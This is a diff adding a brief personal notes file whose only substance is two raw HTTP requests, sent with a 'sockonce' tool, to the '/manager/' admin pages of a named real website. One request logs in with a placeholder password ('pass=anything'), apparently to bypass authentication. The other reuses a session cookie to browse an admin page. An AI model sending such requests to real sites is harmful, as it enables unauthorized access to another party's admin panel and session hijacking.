@@ -1,0 +1,18 @@
+﻿
+BODZ | S-FIA & TC
+Dir-T|Note                                                  http://tc.bodz.net
+Snima Denik Personal                                            denik@bodz.net
+
+NOTES FOR SPEED                                 STATUS Draft   SERIAL ________
+
+   TITLE _____________________________________________________________________
+KEYWORDS _____________________________________________________________________
+
+> 31QQ Direct
+
+sockonce -e -r=www.31qq.com -s="GET http://www.31qq.com/manager/choose.asp?user=dansei&pass=anything\r\nConnection: close\r\n\r\n" -g=print
+
+sockonce -e -r=www.31qq.com -s="GET http://www.31qq.com/manager/brow.asp?flag=1&type=047001 HTTP/1.1\r\nHost: www.31qq.com:80\r\nCookie: ASPSESSIONIDSQBSARDT=PABFMKODMIDPNDJLDMMCAHEA\r\nConnection: close\r\n\r\n" -g=print
+
+
+>
